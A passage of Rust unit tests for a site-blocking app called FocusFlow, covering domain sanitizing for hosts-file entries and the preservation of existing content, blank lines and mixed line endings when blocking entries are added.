        assert_eq!(sanitize_domain_for_hosts("my-site.com"), "my-site.com");
        assert_eq!(sanitize_domain_for_hosts("my--site.com"), "my--site.com");
        assert_eq!(sanitize_domain_for_hosts("a-b-c-d.com"), "a-b-c-d.com");

        // Hyphens at start/end of the WHOLE domain are invalid
        assert_eq!(sanitize_domain_for_hosts("-mysite.com"), "");
        assert_eq!(sanitize_domain_for_hosts("mysite.com-"), "");

        // Note: The current implementation only checks the whole domain's start/end,
        // not individual label boundaries. So hyphens at label boundaries (not at
        // whole domain start/end) are allowed. This is a limitation but provides
        // reasonable security without complex label parsing.
        // Examples that are technically invalid per RFC 1123 but pass:
        assert_eq!(sanitize_domain_for_hosts("mysite-.com"), "mysite-.com");  // hyphen before dot
        assert_eq!(sanitize_domain_for_hosts("my.-site.com"), "my.-site.com");  // hyphen after dot

        // These are properly rejected (whole domain starts/ends with hyphen):
        assert_eq!(sanitize_domain_for_hosts("-example.com"), "");
        assert_eq!(sanitize_domain_for_hosts("example.com-"), "");
    }

    // =============================================================================
    // Content Integrity Tests
    // =============================================================================

    #[test]
    fn test_preserves_windows_line_endings() {
        let content = "127.0.0.1 localhost\r\n::1 localhost\r\n";
        let domains = vec!["example.com".to_string()];

        let result = add_focusflow_entries(content, &domains);

        // Original content should be preserved
        assert!(result.contains("localhost"));
    }

    #[test]
    fn test_handles_mixed_line_endings() {
        let content = "127.0.0.1 localhost\n::1 localhost\r\n192.168.1.1 router\r";
        let domains = vec!["example.com".to_string()];

        let result = add_focusflow_entries(content, &domains);

        // Should not crash and should add entries
        assert!(result.contains(FOCUSFLOW_MARKER_START));
        assert!(result.contains("example.com"));
    }

    #[test]
    fn test_empty_lines_in_content() {
        let content = "\
127.0.0.1 localhost\n\
\n\
\n\
192.168.1.1 router\n\
\n";

        let domains = vec!["example.com".to_string()];
        let result = add_focusflow_entries(content, &domains);

        // Empty lines should be preserved
        assert!(result.contains("localhost"));
        assert!(result.contains("router"));
        assert!(result.contains("example.com"));
    }
}
